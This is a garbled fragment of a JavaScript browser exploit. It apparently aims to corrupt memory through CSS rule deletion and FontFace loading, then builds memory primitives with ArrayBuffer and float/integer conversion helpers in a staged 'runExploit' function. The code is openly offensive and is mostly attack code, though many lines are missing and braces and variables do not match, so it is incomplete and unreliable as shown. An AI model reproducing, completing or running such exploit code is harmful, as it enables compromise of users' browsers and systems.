<script>
let phase = 0;
let state = {};

function log(msg) {
    let d = document.getElementById('log');
    if (d) d.textContent += msg + '\n';
}

function hex(n) {
    if (n < 0) n = n >>> 0;
    return '0x' + n.toString(16).padStart(8, '0');
}

function hex64(low, high) {
    if (low < 0) low = low >>> 0;
    if (high < 0) high = high >>> 0;
    return '0x' + high.toString(16).padStart(8, '0') + low.toString(16).padStart(8, '0');
}

function i2f(low, high) {
    let buf = new ArrayBuffer(8);
    let u32 = new Uint32Array(buf);
    let f64 = new Float64Array(buf);
    u32[0] = low;
    u32[1] = high;
    return f64[0];
}

function f2i(f) {
    let buf = new ArrayBuffer(8);
    let u32 = new Uint32Array(buf);
    let f64 = new Float64Array(buf);
    f64[0] = f;
    return [u32[0], u32[1]];
}

function runExploit() {
    phase++;
    
    if (phase === 1) {
        // Phase 1: Corruption
        log('[PHASE 1] Triggering corruption\n');
        
        let style = document.createElement('style');
        style.id = 's';

            configurable: true,
            get() {

                            unicodeRange: 'U+' + (0x100 + i).toString(16)
                        }));
                    }
                    
                    document.getElementById('s').sheet.deleteRule(0);
                    document.body.offsetTop;
                    
                    window.corrupted = corrupted;
                }
                return undefined;
            }
        });
        
        document.fonts.load('1em x', 'AB');
        log('OOM expected - click OK then click button again\n');
        
    } else if (phase === 2) {
        // Phase 2: Setup controlled primitives

        let fonts = window.corrupted;

            log('[ERROR] No corrupted fonts\n');

        log('[*] Corrupted fonts: ' + fonts.length + '\n');

        let ab1 = new ArrayBuffer(0x10000);
        let u32_1 = new Uint32Array(ab1);
        let f64_1 = new Float64Array(ab1);
        
        // Create secondary buffer for correlation

        let f64_2 = new Float64Array(ab2);
        
        // Fill with different patterns

        }

        state.f64_2 = f64_2;

        try {

            for (let i = 0; i < Math.min(1000, u32_1.length - 4); i++) {
